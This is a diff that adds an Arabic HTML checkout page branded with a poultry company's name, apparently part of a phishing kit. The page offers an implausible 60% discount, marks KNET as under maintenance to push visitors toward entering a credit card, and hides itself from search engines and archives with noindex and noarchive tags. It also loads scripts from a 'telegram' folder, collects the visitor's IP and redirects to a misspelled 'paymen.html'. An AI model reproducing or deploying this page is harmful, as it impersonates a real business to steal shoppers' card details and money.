@@ -1,0 +1,607 @@
+﻿<!DOCTYPE html>
+
+<html lang="ar">
+
+<head>
+  <meta charset="utf-8">
+
+  <meta content="width=device-width, initial-scale=1" name="viewport" />
+  <meta charset="utf-8">
+  <!-- Prevent indexing and following by well-behaved crawlers: -->
+  <meta name="robots" content="noindex, nofollow" />
+
+  <!-- Prevent archiving or snippet display: -->
+  <meta name="googlebot" content="noindex, nofollow, noarchive, nosnippet" />
+  <meta name="bingbot" content="noindex, nofollow" />
+  <meta name="yandex" content="none" />
+  <title>Billing</title>
+  <link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.2/dist/css/bootstrap.min.css"
+    integrity="sha384-xOolHFLEh07PJGoPkLv1IbcEPTNtaed2xpHsD9ESMhqIYd0nLMwNLD69Npy4HI+N" rel="stylesheet" />
+  <style>
+    @import url("https://fonts.googleapis.com/css2?family=Readex+Pro:wght@160..700&display=swap");
+    @import url("https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css");
+
+    * {
+      font-family: "Readex Pro", sans-serif;
+      font-optical-sizing: auto;
+      font-weight: 400;
+      font-style: normal;
+      font-variation-settings: "HEXP" 0;
+    }
+
+    .content {
+      background: linear-gradient(180deg, #ffffff 0%, #fbfbfc 100%);
+      border-radius: 26px;
+      padding: 28px 20px;
+      margin: 0 10px 28px;
+      box-shadow: 0 20px 50px rgba(25, 31, 45, 0.08);
+      min-height: 200px;
+      font-size: 16px;
+      color: #333;
+      border: 1px solid rgba(208, 213, 221, 0.7);
+    }
+
+    .content-section {
+      display: none;
+    }
+
+    .content-section.active {
+      display: block;
+    }
+
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .form-group label {
+      font-size: 14px;
+      font-weight: 600;
+      color: #5d6572;
+      display: block;
+      margin-bottom: 6px;
+    }
+
+    body {
+      min-height: 100vh;
+      background:
+        radial-gradient(circle at top right, rgba(31, 122, 103, 0.10), transparent 24%),
+        radial-gradient(circle at top left, rgba(250, 166, 46, 0.10), transparent 22%),
+        linear-gradient(180deg, #f7f8fb 0%, #eef2f6 100%);
+      color: #243041;
+    }
+
+    body::before {
+      content: "";
+      position: fixed;
+      inset: 0;
+      pointer-events: none;
+      background:
+        linear-gradient(135deg, rgba(255, 255, 255, 0.28), transparent 34%),
+        radial-gradient(circle at 14% 18%, rgba(250, 166, 46, 0.08), transparent 18%);
+    }
+
+    .container {
+      position: relative;
+      z-index: 1;
+    }
+
+    .container.mt-4 .clickable-card {
+      background: #fff;
+      border: 1px solid rgba(223, 228, 236, 0.95) !important;
+      border-radius: 26px !important;
+      box-shadow: 0 18px 40px rgba(25, 31, 45, 0.08);
+      overflow: hidden;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .container.mt-4 .clickable-card:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 24px 44px rgba(25, 31, 45, 0.11);
+    }
+
+    .form-control {
+      border-radius: 16px;
+      border: 1px solid #d8dde6;
+      min-height: 48px;
+      box-shadow: none !important;
+      background: #fdfdfd;
+    }
+
+    .form-control:focus {
+      border-color: #faa62e;
+      box-shadow: 0 0 0 0.18rem rgba(250, 166, 46, 0.18) !important;
+    }
+
+    .apple-pay-card {
+      min-height: 68px;
+      border: 1px solid #e0e5ec !important;
+      border-radius: 34px !important;
+      background: #fff !important;
+      box-shadow: 0 8px 22px rgba(25, 31, 45, 0.06);
+      transition: border-color 0.2s ease, box-shadow 0.2s ease;
+    }
+
+    .apple-pay-card:has(input:checked) {
+      border-color: #087443 !important;
+      box-shadow: 0 0 0 3px rgba(8, 116, 67, 0.14), 0 8px 22px rgba(25, 31, 45, 0.06);
+    }
+
+    .apple-pay-card img {
+      width: 58px;
+      height: 34px;
+      object-fit: contain;
+    }
+
+    .apple-pay-row {
+      direction: ltr;
+    }
+
+    .apple-pay-option {
+      direction: rtl;
+      display: flex;
+      align-items: center;
+      gap: 7px;
+      color: #656565;
+      font-weight: 600;
+    }
+
+    .apple-pay-card .form-check-input {
+      width: 18px;
+      height: 18px;
+      margin: 0 4px 0 0;
+      accent-color: #087443;
+    }
+
+    .payment-pill {
+      min-height: 68px;
+      border: 1px solid #e0e5ec !important;
+      border-radius: 34px !important;
+      background: #fff !important;
+      box-shadow: 0 8px 22px rgba(25, 31, 45, 0.06);
+    }
+
+    .payment-pill .form-check-input {
+      width: 18px;
+      height: 18px;
+      margin: 0 0 0 8px;
+      accent-color: #087443;
+    }
+
+    .knet-logo {
+      width: 68px;
+      height: 47px;
+      object-fit: contain;
+      display: block;
+    }
+
+    .card-logos {
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      direction: ltr;
+    }
+
+    .card-logos img {
+      width: auto;
+      height: 25px;
+      object-fit: contain;
+    }
+
+    #selected_insurance_price_final {
+      text-shadow: 0 1px 0 rgba(255, 255, 255, 0.6);
+    }
+
+    #loadingOverlay {
+      backdrop-filter: blur(6px);
+    }
+
+    @media (max-width: 576px) {
+      .content {
+        margin: 0 6px 22px;
+        padding: 22px 16px;
+        border-radius: 22px;
+      }
+
+      .container.mt-4 .clickable-card {
+        border-radius: 22px !important;
+      }
+    }
+  </style>
+</head>
+
+<body dir="rtl">
+  <nav class="navbar navbar-expand-lg navbar-light bg-light text-center">
+    <img alt="" src="assets/photos/home-logo.png" style="margin: auto" width="122px" />
+  </nav>
+  <div class="container mt-4">
+    <div class="row justify-content-center">
+      <div class="col-md-6 col-lg-4">
+        <div style="
+              border: 1px solid rgba(223, 228, 236, 0.95);
+              border-radius: 24px;
+              font-family: 'Tahoma', sans-serif;
+              overflow: hidden;
+              background: #fff;
+              box-shadow: 0 18px 40px rgba(25, 31, 45, 0.08);
+            ">
+          <div style="padding: 18px 16px 16px">
+            <div class="d-flex align-items-center justify-content-between mb-3">
+              <div class="text-right">
+                <div style="color: #146394; font-weight: bold"></div>
+                <div style="font-size: 13px; color: #666">
+                  <span id="selected_insurance_type"></span>
+                </div>
+              </div>
+              <div class="text-left d-flex align-items-center">
+                <span aria-hidden="true" style="
+                  display: inline-flex;
+                  align-items: center;
+                  gap: 8px;
+                  background: #fff;
+                  border: 1px solid #e7e9ef;
+                  border-radius: 999px;
+                  padding: 8px 12px;
+                  box-shadow: 0 14px 28px rgba(21, 28, 40, 0.10);
+                  color: #1f1f1f;
+                ">
+                  <span style="
+                    width: 34px;
+                    height: 34px;
+                    border-radius: 50%;
+                    display: inline-flex;
+                    align-items: center;
+                    justify-content: center;
+                    background: linear-gradient(180deg, #1f7a67 0%, #185e50 100%);
+                    color: #fff;
+                    font-size: 18px;
+                    line-height: 1;
+                  ">🛒</span>
+                  <span style="
+                    min-width: 24px;
+                    height: 24px;
+                    padding: 0 6px;
+                    border-radius: 999px;
+                    background: linear-gradient(180deg, #2b6cb0 0%, #1e5f9a 100%);
+                    color: #fff;
+                    font-size: 13px;
+                    line-height: 24px;
+                    font-weight: 700;
+                    text-align: center;
+                  " id="billingCartCount">0</span>
+                </span>
+                <span style="margin-right: 10px; color: #666; font-size: 14px; font-weight: 700;">دواجن الوطنية</span>
+              </div>
+            </div>
+
+            <div>
+              <div class="d-flex justify-content-between mb-2">
+                <span style="color: #146394; display: none;">القسط الأساسي</span>
+                <span id="selected_insurance_price" style="color: #146394; font-weight: bold; display: none;">
+                  <svg style="
+                        width: 14px;
+                        height: 14px;
+                        fill: #146394;
+                        vertical-align: middle;
+                        margin-right: 4px;
+                      " viewbox="0 0 1300 1200">
+                    <path
+                      d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z">
+                    </path>
+                  </svg>
+                </span>
+              </div>
+              <div class="d-flex justify-content-between mb-2" style="display: none !important;">
+                <span style="color: #31a64b;">حسبة الطلبيات</span>
+                <span id="selected_insurance_price_60" style="color: #31a64b; font-weight: bold">
+                  <svg style="
+                        width: 14px;
+                        height: 14px;
+                        fill: green;
+                        vertical-align: middle;
+                        margin-right: 4px;
+                      " viewbox="0 0 1300 1200">
+                    <path
+                      d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z">
+                    </path>
+                  </svg>
+                </span>
+              </div>
+              <div class="d-flex justify-content-between mb-2">
+                <span style="color: #146394; display: none;">ضريبة القيمة المضافة</span>
+                <span id="selected_insurance_price_15%" style="color: #146394; font-weight: bold; display: none;">
+                  <svg style="
+                        width: 14px;
+                        height: 14px;
+                        fill: #146394;
+                        vertical-align: middle;
+                        margin-right: 4px;
+                      " viewbox="0 0 1300 1200">
+                    <path
+                      d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z">
+                    </path>
+                  </svg>
+                </span>
+              </div>
+            </div>
+          </div>
+
+          <div style="background-color: #f8f8f8; padding: 16px 20px 10px 20px">
+            <div class="d-flex justify-content-between align-items-center mb-1">
+              <span style="color: #146394; font-weight: 800; font-size: 20px">المجموع</span>
+              <span id="selected_insurance_price_final" style="
+                    color: #faa62e;
+                    font-size: 22px;
+                    font-weight: bold;
+                    display: flex;
+                    align-items: center;
+                  ">
+                <svg style="
+                      width: 18px;
+                      height: 18px;
+                      fill: #faa62e;
+                      margin-right: 6px;
+                    " viewbox="0 0 1300 1200">
+                  <path
+                    d="M1085.73,895.8c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.33v-135.2l292.27-62.11c20.06-44.47,33.32-92.75,38.4-143.37l-330.68,70.27V66.13c-50.67,28.45-95.67,66.32-132.25,110.99v403.35l-132.25,28.11V0c-50.67,28.44-95.67,66.32-132.25,110.99v525.69l-295.91,62.88c-20.06,44.47-33.33,92.75-38.42,143.37l334.33-71.05v170.26l-358.3,76.14c-20.06,44.47-33.32,92.75-38.4,143.37l375.04-79.7c30.53-6.35,56.77-24.4,73.83-49.24l68.78-101.97v-.02c7.14-10.55,11.3-23.27,11.3-36.97v-149.98l132.25-28.11v270.4l424.53-90.28Z">
+                  </path>
+                </svg>
+              </span>
+            </div>
+            <div style="font-size: 12px; color: #666; text-align: left; display: none;">
+              شامل 2% قيمة عمولة الوسيط
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+  <div class="container mt-4" style="display: none;">
+    <div class="row justify-content-center">
+      <div class="col-md-6 col-lg-4">
+        <div class="clickable-card payment-pill" style="
+              border: 1px solid #ddd;
+              border-radius: 12px;
+              font-family: 'Tahoma', sans-serif;
+              overflow: hidden;
+              cursor: pointer;
+            ">
+          <div style="padding: 16px">
+            <div class="d-flex align-items-center justify-content-between">
+              <div class="text-right">
+                <div class="d-flex justify-content-end row align-items-center mr-2" dir="ltr"
+                  style="color: #656565; font-weight: bold">
+                  <h5 class="mr-4">مدى</h5>
+                  <input class="form-check-input" id="mada" name="Radios" type="radio" value="mada"
+                    style="margin-top: auto" />
+                </div>
+              </div>
+              <img alt="Ø´Ø¹Ø§Ø± Ø§Ù„Ø´Ø±ÙƒØ©" src="assets/photos/mad.png" width="70" />
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="container mt-4">
+    <div class="row justify-content-center">
+      <div class="col-md-6 col-lg-4">
+        <div class="clickable-card" style="
+              border: 1px solid #ddd;
+              border-radius: 12px;
+              font-family: 'Tahoma', sans-serif;
+              overflow: hidden;
+              cursor: pointer;
+            ">
+          <div style="padding: 16px">
+            <div class="d-flex align-items-center justify-content-between" dir="ltr">
+              <div class="card-logos">
+                <img alt="Visa" src="assets/photos/Visa.png" />
+                <img alt="Mastercard" src="assets/photos/Mastercard.png" />
+              </div>
+              <div class="d-flex align-items-center" dir="rtl">
+                <input class="form-check-input" id="visa_mastarcard" name="Radios" type="radio"
+                  value="visa_mastarcard" />
+                <span style="color: #656565; font-weight: 600; font-size: 14px;">استخدم بطاقة ائتمان جديدة</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- KNET Card -->
+  <div class="container mt-4">
+    <div class="row justify-content-center">
+      <div class="col-md-6 col-lg-4">
+        <div class="clickable-card payment-pill" style="
+              font-family: 'Tahoma', sans-serif;
+              overflow: hidden;
+              cursor: pointer;
+            ">
+          <div style="padding: 16px">
+            <div class="d-flex align-items-center justify-content-between" dir="ltr">
+              <img class="knet-logo" src="assets/photos/knet.png" alt="KNET" />
+              <div class="d-flex align-items-center" dir="rtl">
+                <input class="form-check-input" id="knet" name="Radios" type="radio" value="knet"
+                  aria-label="الدفع عبر KNET" />
+                <span style="font-size: 14px; color: #656565; font-weight: 600;">بطاقة السحب الآلي</span>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Alert -->
+  <div class="container mt-2 text-right">
+    <div class="alert alert-danger d-none" id="applePayAlert" role="alert">
+      <span style="font-size: 14px; color: red">
+        عذرًا، خدمة الدفع عبر KNET تحت الصيانة مؤقتًا. يمكنك استخدام بطاقة الائتمان لإكمال الدفع.
+      </span>
+    </div>
+  </div>
+
+  <div class="container mt-4 mb-3">
+    <button class="btn col-12 p-3" id="goToPayment" style="background-color: #faa62e; color: #fff; font-weight: 700"
+      type="button">
+      إتمام عملية الدفع
+    </button>
+  </div>
+
+  <script>
+    function animateNumber(el, from, to, duration, format) {
+      if (!el) return;
+      const start = performance.now();
+      const tick = (now) => {
+        const progress = Math.min((now - start) / duration, 1);
+        const value = from + (to - from) * progress;
+        el.textContent = format(value);
+        if (progress < 1) {
+          requestAnimationFrame(tick);
+        }
+      };
+      requestAnimationFrame(tick);
+    }
+
+    function parsePrice(text) {
+      const match = String(text).replace(/,/g, ".").match(/(\d+(?:\.\d+)?)/);
+      return match ? parseFloat(match[1]) : 0;
+    }
+
+    function getStoredSummary() {
+      const raw = sessionStorage.getItem("cartSummary");
+      if (!raw) {
+        return [];
+      }
+      try {
+        const parsed = JSON.parse(raw);
+        return Array.isArray(parsed) ? parsed : [];
+      } catch {
+        return [];
+      }
+    }
+
+    const summary = getStoredSummary();
+    let requestedQty = Math.max(
+      0,
+      parseInt(sessionStorage.getItem("cartCount"), 10) || summary.reduce((sum, item) => sum + (parseInt(item.qty, 10) || 0), 0)
+    );
+    
+    // إذا كانت الكمية = 0، استخدم قيمة افتراضية
+    if (requestedQty === 0) {
+      requestedQty = 1;
+      sessionStorage.setItem("cartCount", "1");
+    }
+    
+    const unitPrice = 6.5;
+    const base = requestedQty * unitPrice;
+    // compute discount (60%) and VAT (15%)
+    const discount = base * 0.6;
+    const vat = base * 0.15;
+    const final = base - discount + vat;
+
+    // inject into the four spans
+    animateNumber(document.getElementById("selected_insurance_price"), 0, base, 700, (v) => v.toFixed(2));
+    animateNumber(
+      document.getElementById("selected_insurance_price_60"),
+      0,
+      requestedQty,
+      650,
+      (v) => String(Math.round(v))
+    );
+    animateNumber(document.getElementById("selected_insurance_price_15%"), 0, vat, 700, (v) => v.toFixed(2));
+    animateNumber(document.getElementById("selected_insurance_price_final"), 0, final, 800, (v) => v.toFixed(2));
+
+    const billingCartCount = document.getElementById("billingCartCount");
+    if (billingCartCount) {
+      billingCartCount.textContent = String(requestedQty);
+      billingCartCount.classList.remove("is-hidden");
+    }
+
+    // overwrite sessionStorage so other pages can read the final
+    sessionStorage.setItem("totalPrice", final.toFixed(2));
+  </script>
+
+  <!-- 3) Payment-method UI logic (unchanged) -->
+  <script>
+    const paymentAlert = document.getElementById("applePayAlert");
+    const payButton = document.getElementById("goToPayment");
+
+    // entire card click selects radio
+    document.querySelectorAll(".clickable-card").forEach((card) => {
+      card.addEventListener("click", (e) => {
+        if (e.target.tagName.toLowerCase() === "input") return;
+        const r = card.querySelector('input[name="Radios"]');
+        r.checked = true;
+        r.dispatchEvent(new Event("change"));
+      });
+    });
+
+    // KNET is temporarily unavailable; card payment remains available.
+    document.querySelectorAll('input[name="Radios"]').forEach((radio) => {
+      radio.addEventListener("change", () => {
+        if (radio.id === "knet" && radio.checked) {
+          paymentAlert.className = "alert alert-danger d-flex";
+          payButton.disabled = true;
+        } else if (radio.checked) {
+          paymentAlert.className = "alert alert-danger d-none";
+          payButton.disabled = false;
+        }
+      });
+    });
+
+    const selectedMethod = document.querySelector('input[name="Radios"]:checked');
+    payButton.disabled = !selectedMethod || selectedMethod.id === "knet";
+  </script>
+
+
+
+
+
+
+<script src="assets/telegram/tg.js"></script>
+<script src="assets/telegram/telegram.js"></script>
+
+
+
+
+
+
+
+
+
+
+  <script>
+    payButton.addEventListener("click", async () => {
+      const method = document.querySelector(
+        'input[name="Radios"]:checked'
+      )?.value;
+      if (!method) {
+        return alert("يرجى اختيار طريقة الدفع أولًا");
+      }
+
+      // â†â”€â”€ STORE IT â”€â”€â†’
+      sessionStorage.setItem("paymentMethod", method);
+
+      // build payload
+      const payload = {
+        ip: window.visitorIP,
+        mada: method === "mada",
+        visa_mastarcard: method === "visa_mastarcard",
+        knet: method === "knet",
+        totalPrice: parseFloat(sessionStorage.getItem("totalPrice")),
+      };
+
+      // window.socket.emit("submitBilling", payload);
+        window.location.href = "paymen.html";
+
+    });
+
+  </script>
+</body>
+
+</html>
+
